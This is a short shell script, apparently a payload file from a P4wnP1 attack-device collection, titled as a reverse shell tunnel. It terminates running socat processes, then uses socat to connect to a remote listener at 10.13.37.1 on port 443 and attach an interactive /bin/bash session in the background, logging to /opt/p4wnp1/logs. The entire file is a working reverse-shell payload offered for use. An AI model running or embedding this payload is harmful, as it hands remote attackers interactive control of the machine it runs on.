# payloads/network/reverse_shell_tunnel.sh
######################################

### Description: Reverse shell to remote listener (socat or bash+nc)
### Requirements: socat (recommended), or netcat

PAYLOAD_NAME="reverse_shell_tunnel"
LOG_DIR="/opt/p4wnp1/logs"
REMOTE_HOST="10.13.37.1"
REMOTE_PORT="443"

mkdir -p "$LOG_DIR"

pkill socat || true

# Check if socat is installed
if ! command -v socat &> /dev/null; then
  echo "[!] socat not found. Install with: sudo apt install socat"
  exit 1
fi

# Start reverse shell
socat TCP:$REMOTE_HOST:$REMOTE_PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane > "$LOG_DIR/${PAYLOAD_NAME}.log" 2>&1 &

echo "[+] Reverse shell initiated to $REMOTE_HOST:$REMOTE_PORT. Logs in $LOG_DIR/${PAYLOAD_NAME}.log"

exit 0
